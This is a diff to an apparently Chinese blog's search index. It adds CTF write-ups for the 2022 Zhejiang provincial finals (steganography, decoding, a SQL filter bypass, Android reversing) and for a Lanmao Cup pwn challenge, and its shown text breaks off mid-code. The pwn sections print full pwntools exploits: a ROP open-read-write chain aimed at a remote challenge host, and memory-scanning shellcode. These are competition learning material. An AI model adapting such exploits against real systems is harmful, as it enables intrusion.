@@ -129,6 +129,136 @@
       </tags>
   </entry>
   <entry>
+    <title>2022浙江省ctf决赛</title>
+    <url>/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>下载附件，是一张图片</p>
+<p>放入kali中binwalk</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image002.gif" class="" title="图片">
+
+<p>发现由两张图片拼接成，foremost分离</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image004.gif" class="" title="图片">
+
+<p>分离出这样一张图片，找了一圈也没有啥线索，想起来可能会在两张图片之间放些东西，把原图拖进winhex看看，搜索JFIF</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image006.gif" class="" title="图片">
+
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image008.gif" class="" title="图片">
+
+<p>发现了一串加密字符串，用CyberChef解密</p>
+<p>经过尝试，rot13-&gt;base64-&gt;base32解密得到flag</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image010.gif" class="" title="图片">
+
+<p>DASCTF{38392d8bfe3196fc0fd29bcb14fdaceb}</p>
+<p>m4a</p>
+<p>下载附件，发现是一个名为m4a的无后缀文件</p>
+<p>首先想到的就是拖进winhex看看</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image012.gif" class="" title="图片">
+
+<p>发现了翻转的16进制文件，复制16进制数值到随波逐流：其他工具-&gt;Hex_str翻转</p>
+<p>就能得到压缩包的16进制格式了</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image014.gif" class="" title="图片">
+
+<p>复制内容，用winhex新建出文件放入数据导出为压缩包</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image016.gif" class="" title="图片">
+
+<p>打开是atbash.txt，但是压缩包损坏，原因是我们把这个文件的16进制都倒过来了，这里只需要压缩包的那一部分就好，不过可以直接WinRAR修复压缩包</p>
+<p>发现需要密码，回到m4a文件，m4a一般是音频的后缀，加上m4a后缀试试</p>
+<p>能听出是morse密码，放入au</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image018.gif" class="" title="图片">
+
+<p>能直接根据长短敲出摩斯码-… .- ….- ..– -… -.-. . ..-. -.-. ..— —– ….-</p>
+<p>解码得BA43BCEFC204，应该是压缩包密码了,得到(+w)v&amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN</p>
+<p>应该是加密字符串，根据文件名atbash提示，rot47-&gt;atbash Cipher</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image020.gif" class="" title="图片">
+
+<p>得到flag，DASCTF{5e0f98a95f79829b7a484a54066cb08f}</p>
+<h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p>下载附件，发现是一张png图片</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image022.gif" class="" title="图片">
+
+<p>在010中发现图片16进制尾有一大串有规律的字符，CyberChef解码知道是emoji</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image024.gif" class="" title="图片">
+
+<p>这里看0rays战队的wp学到了新东西，还可以直接爆破，如下</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image026.gif" class="" title="图片">
+
+<p>得到emoji：</p>
+<p>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🍍🎤🐘🌏ℹ⌨😍🎈✉🤣🛩🍌🚪🍴ℹ☺🚹❓🍴🔬🌪🍵👣🔄☃👌😎👌🔄👌🔪🍌👁🍍🍌🌏🎃🚰🍵🐍🎅✅🍍🦓😎😊🤣🏹🍍💧🔄🔄🤣👁🥋🚫☺🍴😁🚫😇🚰⏩😍🌿💵🦓😇🛩✖🕹🐎📂📂💧🗒🗒</p>
+<p>要找个key进行aes解密，再去看看图片的lsb</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image028.gif" class="" title="图片">
+
+<p>zsteg可以发现有压缩包，但是这里可以看的到并不全，于是用stegsolve找找</p>
+<p>RGB0通道找到了该压缩包<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image030.gif" class="" title="图片"></p>
+<p>winhex导出来</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image032.gif" class="" title="图片">
+
+<p> 保存为压缩包，解压出来一个key.txt，里面是data块</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image034.gif" class="" title="图片">
+
+<p>用脚本转换一下</p>
+<p>normalKeys &#x3D; {“04”:”a”, “05”:”b”, “06”:”c”, “07”:”d”, “08”:”e”, “09”:”f”, “0a”:”g”, “0b”:”h”, “0c”:”i”, “0d”:”j”, “0e”:”k”, “0f”:”l”, “10”:”m”, “11”:”n”, “12”:”o”, “13”:”p”, “14”:”q”, “15”:”r”, “16”:”s”, “17”:”t”, “18”:”u”, “19”:”v”, “1a”:”w”, “1b”:”x”, “1c”:”y”, “1d”:”z”,”1e”:”1”, “1f”:”2”, “20”:”3”, “21”:”4”, “22”:”5”, “23”:”6”,”24”:”7”,”25”:”8”,”26”:”9”,”27”:”0”,”28”:”<RET>“,”29”:”<ESC>“,”2a”:”<DEL>“, “2b”:”\t”,”2c”:”<SPACE>“,”2d”:”-“,”2e”:”&#x3D;”,”2f”:”[“,”30”:”]”,”31”:”\“,”32”:”<NON>“,”33”:”;”,”34”:”‘“,”35”:”<GA>“,”36”:”,”,”37”:”.”,”38”:”&#x2F;“,”39”:”<CAP>“,”3a”:”<F1>“,”3b”:”<F2>“, “3c”:”<F3>“,”3d”:”<F4>“,”3e”:”<F5>“,”3f”:”<F6>“,”40”:”<F7>“,”41”:”<F8>“,”42”:”<F9>“,”43”:”<F10>“,”44”:”<F11>“,”45”:”<F12>“}</p>
+<p>shiftKeys &#x3D; {“04”:”A”, “05”:”B”, “06”:”C”, “07”:”D”, “08”:”E”, “09”:”F”, “0a”:”G”, “0b”:”H”, “0c”:”I”, “0d”:”J”, “0e”:”K”, “0f”:”L”, “10”:”M”, “11”:”N”, “12”:”O”, “13”:”P”, “14”:”Q”, “15”:”R”, “16”:”S”, “17”:”T”, “18”:”U”, “19”:”V”, “1a”:”W”, “1b”:”X”, “1c”:”Y”, “1d”:”Z”,”1e”:”!”, “1f”:”@”, “20”:”#”, “21”:”$”, “22”:”%”, “23”:”^”,”24”:”&amp;”,”25”:”*”,”26”:”(“,”27”:”)”,”28”:”<RET>“,”29”:”<ESC>“,”2a”:”<DEL>“, “2b”:”\t”,”2c”:”<SPACE>“,”2d”:”_”,”2e”:”+”,”2f”:”{“,”30”:”}”,”31”:”|”,”32”:”<NON>“,”33”:”&quot;“,”34”:”:”,”35”:”<GA>“,”36”:”&lt;”,”37”:”&gt;”,”38”:”?”,”39”:”<CAP>“,”3a”:”<F1>“,”3b”:”<F2>“, “3c”:”<F3>“,”3d”:”<F4>“,”3e”:”<F5>“,”3f”:”<F6>“,”40”:”<F7>“,”41”:”<F8>“,”42”:”<F9>“,”43”:”<F10>“,”44”:”<F11>“,”45”:”<F12>“}</p>
+<p>keys &#x3D; open(‘key.txt’)</p>
+<p>output &#x3D; “”</p>
+<p>for line in keys:</p>
+<p>  k &#x3D; line[1]</p>
+<p>  n &#x3D; line[4:6]</p>
+<p>  if k &#x3D;&#x3D; ‘0’:</p>
+<p>​     print(normalKeys[n], end&#x3D;’’)</p>
+<p>  elif k &#x3D;&#x3D; ‘2’:</p>
+<p>​     print(shiftKeys[n], end&#x3D;’’)</p>
+<p>得到：</p>
+<p>mik<DEL>mae<DEL>shiy<DEL><SPACE>:<DEL>FindT<DEL>Theo<DEL>Realg<DEL>Keyg<DEL>andl<DEL>Makee<DEL>It!d<DEL></p>
+<p>把<DEL>的前面一位删除</p>
+<p>mimimashiFindTheRealKeyandMakeIt!</p>
+<p>但是发现并不是真正的key，真正的key是刚好被删掉的几个字符，能通过前面三位的k、e、y发现</p>
+<p>得到key:Toggled</p>
+<p>通过aes-emoji解密可得</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image036.gif" class="" title="图片">
+
+<p>DASCTF{ad15eecd2978bc5c70597d14985412c4}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>测试后发现题目将空格过滤了</p>
+<p>使用内连注释符绕过</p>
+<p>最后发现flag在emails表中</p>
+   <img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220926183506725.png" class="" title="image-20220926183506725">                            
+
+<h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><p>随机种子数是时间戳，我们可以利用本地环境提前预知时间戳为种子后，数找到组中对应函数存放的位置，然后一直刷新，在对应的时间戳处获得flag</p>
+ <img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220926183515680.png" class="" title="image-20220926183515680">
+
+
+
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><p>逆向后mainactivity如下图所示</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140508630.png" class="" title="image-20220924140508630">
+
+<p>可以看到账号密码输入成功后进入afterlog</p>
+<p>afterlog如下图所示</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140552062.png" class="" title="image-20220924140552062">
+
+<p>就放了一个视图，然后进入这个视图</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140630237.png" class="" title="image-20220924140630237">
+
+<p>可以看到背景是一张图片，最后加压缩出图片可以看到flag</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/image-20220924140722575.png" class="" title="image-20220924140722575">
+
+
+
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GO-MAZE-v4"><a href="#GO-MAZE-v4" class="headerlink" title="GO-MAZE-v4"></a>GO-MAZE-v4</h2><p>走完地图发现输出的是假flag，但是后门还是存在一个出入点，于是输入大量垃圾数据，发现程序崩溃，所以猜测存在栈溢出漏洞，然后静态分析</p>
+<img src="/2022/09/26/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%86%B3%E8%B5%9B/clip_image002.png" class="" title="clip_image002">
+
+<p>这里其实给了提示，v14这个参数存在溢出，然后就是构造rop链打orw。</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">#p=process(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;1.14.97.218&#x27;, 26200)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">poprax=0x400a4f</span><br><span class="line">syscall=0x4025ab</span><br><span class="line">poprdi=0x4008f6</span><br><span class="line">poprsi=0x40416f</span><br><span class="line">poprdx=0x51d4b6</span><br><span class="line">poprbx=0x402498</span><br><span class="line">popdxsi=0x51d559</span><br><span class="line">buf=0x98a000</span><br><span class="line">leave=0x4015cb</span><br><span class="line"></span><br><span class="line">rop=b&#x27;&#x27;</span><br><span class="line">rop=p64(poprdi)+p64(0)+p64(popdxsi)+p64(0x100)+p64(buf+0x300)+p64(syscall)+p64(leave)</span><br><span class="line"></span><br><span class="line">payload=p64(0)+p64(poprax)+p64(2)+p64(poprdi)+p64(elf.search(b&#x27;flag&#x27;).__next__())+p64(poprsi)+p64(0)+p64(syscall)</span><br><span class="line">payload+=p64(poprax)+p64(0)+p64(poprdi)+p64(3)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)</span><br><span class="line">payload+=p64(poprax)+p64(1)+p64(poprdi)+p64(1)+p64(poprsi)+p64(buf)+p64(poprdx)+p64(0x100)+p64(syscall)</span><br><span class="line"></span><br><span class="line">def maps():</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;s&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;d&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line">    p.sendline(b&#x27;w&#x27;)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    p.recvuntil(&#x27;flag&#x27;)</span><br><span class="line">    p.sendline(b&#x27;a&#x27;*0x178+p64(buf+0x300)+rop)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">maps()</span><br><span class="line">pwn()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>misc</tag>
+        <tag>web</tag>
+        <tag>re</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2022浙江省ctf初赛</title>
     <url>/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/</url>
     <content><![CDATA[<blockquote>
@@ -406,6 +536,59 @@
       </tags>
   </entry>
   <entry>
+    <title>蓝帽杯初赛pwn1复现</title>
+    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道升级版的ret2shellcode</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224631699.png" class="" title="image-20220710224631699">
+
+
+
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224715244.png" class="" title="image-20220710224715244">
+
+<p><code>init_io()</code>就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224957314.png" class="" title="image-20220710224957314">
+
+<p>可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。</p>
+<h3 id="init-main"><a href="#init-main" class="headerlink" title="init_main()"></a>init_main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225220354.png" class="" title="image-20220710225220354">
+
+<p>可以看到<code>heap_mem</code>这个全局变量保存了堆的malloc地址，然后下面的代码其实就将bss段上的内容写到堆上，具体内容如下图所示。</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225451610.png" class="" title="image-20220710225451610">
+
+
+
+<h3 id="init-flag"><a href="#init-flag" class="headerlink" title="init_flag()"></a>init_flag()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225612172.png" class="" title="image-20220710225612172">
+
+<p>看到了不得了的东西，直接将flag写到了bss段上。</p>
+<h3 id="go"><a href="#go" class="headerlink" title="go()"></a>go()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225729898.png" class="" title="image-20220710225729898">
+
+<p>因为<code>heap_mem</code>上保存的是堆的malloc地址，所以这里我们写入的内容是写到了之前创建的堆上，然后也返回到我们之前的堆上面去。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>首先运行一下程序</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230113827.png" class="" title="image-20220710230113827">
+
+<p>在随便输入一串数据后程序果然崩溃了，当时我以为造成程序崩溃的是堆上的垃圾数据，所以分析到这便没了后续。但是比较敏感的话其实可以感觉的得出来在<code>init_mem()</code>中堆上写的其实并不是随随便便的垃圾数据，进入调试一下便可验证。</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230644865.png" class="" title="image-20220710230644865">
+
+<p>如上图所示，其实<code>ret heap_mem()</code>后程序还能继续正常执行，写入到堆中的其实是一句句可执行的汇编指令，最后导致程序崩溃的原因是在后面。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上诉分析程序的利用点还是很好看出来的，我们只需要在read的时候向程序写入攻击的shellcode便可正常执行获取flag。这里可以选择利用write系统调用，直接将flag打印出来。</p>
+<p>&#x3D;&#x3D;因为开启了PIE，所以这里的flag的地址需要我们进行爆破一下，但爆破有个简单的方法：&#x3D;&#x3D;</p>
+<p>在执行完系统调用后，rcx会保存下一条指令的地址（原因涉及内核，感兴趣可去了解），如下图所示。</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710231937873.png" class="" title="image-20220710231937873">
+
+<p>利用这点我们就可以定位到shellcode地址，因为shllcode保存地址和flag保存地址就差28位，利用and获得其高位保存在rsi 作为基地址，后28位需要爆破，r15存储偏移，每次打印0x1000个字符，打印后跳转到$-0x19也就是mov rax，1处，然后继续从基地址+0x1000开始打印0x1000个字符，如此循环即可。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;39.106.156.74&quot;,23470)</span></span><br><span class="line"><span class="comment">#start=0</span></span><br><span class="line">start=<span class="number">0x500000000000</span></span><br><span class="line"><span class="comment">#addr=0x5633c143f000</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">    mov r12,0xfffff0000000</span></span><br><span class="line"><span class="string">    mov r15,0x1000#r15储存偏移</span></span><br><span class="line"><span class="string">    mov rdx,0x1000#打印长度设置为0x1000</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    syscall#write(rdi,rsi,rdx)</span></span><br><span class="line"><span class="string">    mov rsi,rcx#write执行后rcx 储存着shllcode的相关地址</span></span><br><span class="line"><span class="string">    and rsi,r12#丢弃后28位</span></span><br><span class="line"><span class="string">    add rsi,r15#rsi=rsi+偏移地址</span></span><br><span class="line"><span class="string">    add r15,0x1000#偏移递增0x1000</span></span><br><span class="line"><span class="string">    jmp $-0x19#循环 跳转到mov rax，1 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(start)</span><br><span class="line">payload=asm(code)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;&#x27;</span>+sh.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实这题不难，比赛过程中被自己误导后就放弃了，也个自己涨了教训，当遇到“绝境“的时候不妨静下心仔细调试一下。</p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>变量1（BUGKU）</title>
     <url>/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/</url>
     <content><![CDATA[<p>前言：php是一门非常好的语言^o^</p>
@@ -462,59 +645,6 @@
       </categories>
       <tags>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>蓝帽杯初赛pwn1复现</title>
-    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/</url>
-    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道升级版的ret2shellcode</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224631699.png" class="" title="image-20220710224631699">
-
-
-
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224715244.png" class="" title="image-20220710224715244">
-
-<p><code>init_io()</code>就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224957314.png" class="" title="image-20220710224957314">
-
-<p>可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。</p>
-<h3 id="init-main"><a href="#init-main" class="headerlink" title="init_main()"></a>init_main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225220354.png" class="" title="image-20220710225220354">
-
-<p>可以看到<code>heap_mem</code>这个全局变量保存了堆的malloc地址，然后下面的代码其实就将bss段上的内容写到堆上，具体内容如下图所示。</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225451610.png" class="" title="image-20220710225451610">
-
-
-
-<h3 id="init-flag"><a href="#init-flag" class="headerlink" title="init_flag()"></a>init_flag()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225612172.png" class="" title="image-20220710225612172">
-
-<p>看到了不得了的东西，直接将flag写到了bss段上。</p>
-<h3 id="go"><a href="#go" class="headerlink" title="go()"></a>go()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225729898.png" class="" title="image-20220710225729898">
-
-<p>因为<code>heap_mem</code>上保存的是堆的malloc地址，所以这里我们写入的内容是写到了之前创建的堆上，然后也返回到我们之前的堆上面去。</p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>首先运行一下程序</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230113827.png" class="" title="image-20220710230113827">
-
-<p>在随便输入一串数据后程序果然崩溃了，当时我以为造成程序崩溃的是堆上的垃圾数据，所以分析到这便没了后续。但是比较敏感的话其实可以感觉的得出来在<code>init_mem()</code>中堆上写的其实并不是随随便便的垃圾数据，进入调试一下便可验证。</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230644865.png" class="" title="image-20220710230644865">
-
-<p>如上图所示，其实<code>ret heap_mem()</code>后程序还能继续正常执行，写入到堆中的其实是一句句可执行的汇编指令，最后导致程序崩溃的原因是在后面。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上诉分析程序的利用点还是很好看出来的，我们只需要在read的时候向程序写入攻击的shellcode便可正常执行获取flag。这里可以选择利用write系统调用，直接将flag打印出来。</p>
-<p>&#x3D;&#x3D;因为开启了PIE，所以这里的flag的地址需要我们进行爆破一下，但爆破有个简单的方法：&#x3D;&#x3D;</p>
-<p>在执行完系统调用后，rcx会保存下一条指令的地址（原因涉及内核，感兴趣可去了解），如下图所示。</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710231937873.png" class="" title="image-20220710231937873">
-
-<p>利用这点我们就可以定位到shellcode地址，因为shllcode保存地址和flag保存地址就差28位，利用and获得其高位保存在rsi 作为基地址，后28位需要爆破，r15存储偏移，每次打印0x1000个字符，打印后跳转到$-0x19也就是mov rax，1处，然后继续从基地址+0x1000开始打印0x1000个字符，如此循环即可。</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;39.106.156.74&quot;,23470)</span></span><br><span class="line"><span class="comment">#start=0</span></span><br><span class="line">start=<span class="number">0x500000000000</span></span><br><span class="line"><span class="comment">#addr=0x5633c143f000</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">    mov 